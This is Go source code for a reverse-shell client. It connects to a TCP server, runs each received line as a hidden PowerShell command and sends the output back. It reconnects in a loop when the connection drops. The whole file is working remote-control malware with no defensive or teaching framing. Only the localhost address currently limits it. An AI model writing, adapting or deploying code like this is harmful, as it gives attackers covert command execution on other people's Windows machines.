package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"time"
)

const (
	//connection info
	connHost = "localhost"
	connPort = "8080"
	connType = "tcp"
	//command list
	exi   = "exit"
	hello = "hello"
)

func hErr(err error) {
	if err != nil {
		fmt.Println("Error:", err.Error())
	}
}

func main() {
	fmt.Println("Connecting to " + connType + " server " + connHost + ":" + connPort)
	conn, err := net.Dial(connType, connHost+":"+connPort)
	if err != nil {
		hErr(err)
		time.Sleep(10 * time.Second)
		main()
	}

	for {
		fmt.Println("Waiting for command")

		message, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			conn.Close()
			hErr(err)
			main()
		}
		out, err := exec.Command("powershell.exe", "-NoProfile", "-WindowStyle", "hidden", "-NoLogo", strings.TrimSuffix(message, "\n")).Output()
		fmt.Println(message)
		if strings.Contains(message, hello) {
			fmt.Println("greeting")
			conn.Write([]byte("hello 2 you 2"))
		} else {
			fmt.Println(string(out))
			conn.Write([]byte(out))
		}
	}
}
